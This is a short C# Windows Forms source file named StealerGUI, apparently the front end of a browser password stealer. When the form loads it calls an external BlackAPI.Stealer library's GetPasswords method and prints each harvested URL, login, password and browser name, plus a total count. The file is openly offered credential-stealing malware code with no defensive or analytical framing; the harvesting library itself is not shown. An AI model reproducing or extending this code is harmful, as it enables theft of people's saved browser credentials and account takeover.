using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace StealerGUI
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            BlackAPI.Stealer stealer = new BlackAPI.Stealer();
            var stealerresult = stealer.GetPasswords();
            if (stealerresult.Work)
            {
                foreach (var password in stealerresult.Passwords)
                {
                    Console.WriteLine("Url: " + password.url);
                    Console.WriteLine("Login: " + password.login);
                    Console.WriteLine("Password: " + password.password);
                    Console.WriteLine("Broser: " + password.browser);
                }
                Console.WriteLine("Total passwords: " + stealerresult.Passwords.Count);
            }
            else
            {
                Console.WriteLine("Passwords not found");
            }
        }
    }
}
